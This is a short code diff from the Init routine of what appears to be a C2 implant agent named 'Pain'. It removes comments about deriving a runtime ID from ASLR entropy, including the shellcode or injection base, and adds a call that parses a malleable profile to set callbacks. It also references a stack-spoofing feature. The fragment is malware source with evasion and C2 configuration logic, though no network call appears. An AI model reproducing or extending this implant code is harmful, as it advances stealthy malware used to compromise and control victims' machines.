@@ -174,15 +174,6 @@ DECLFN void Root::Agent::Init()
     if ( Self->Config.UserAgent ) Mem_Copy( Self->Config.UserAgent, ua_str,   ua_len   );
 
     // Runtime UUID from ASLR entropy - pure 32-bit arithmetic, no large constants.
-    // 64-bit literals (UINT64 / ULL) can be placed in .rodata by the compiler under -O2;
-    // the linker script keeps only .text, so those references become garbage at runtime.
-    // Using only ULONG (32-bit) values and a shift-rotate macro avoids .rodata entirely.
-    //
-    // Entropy sources (all vary independently per execution due to ASLR / OS scheduling):
-    //   pid  - process ID           (always unique between processes)
-    //   tid  - main thread ID       (varies per-run)
-    //   stk  - heap pointer low 32  (ASLR randomises heap base)
-    //   base - shellcode base low 32 (ASLR randomises DLL/injection base)
     {
         ULONG pid  = Self->Session.ProcessID;
         ULONG tid  = Self->Session.ThreadID;
@@ -300,6 +291,9 @@ DECLFN void Root::Agent::Init()
 #if PAIN_STACK_SPOOF
     Spoof_Init();
 #endif
+
+    // Parse malleable profile blob; sets Self->Config.Callbacks[] when count > 0
+    Malleable_Init();
 
     Self->Ntdll.DbgPrint( "[Pain] Init() done\n" );
 }
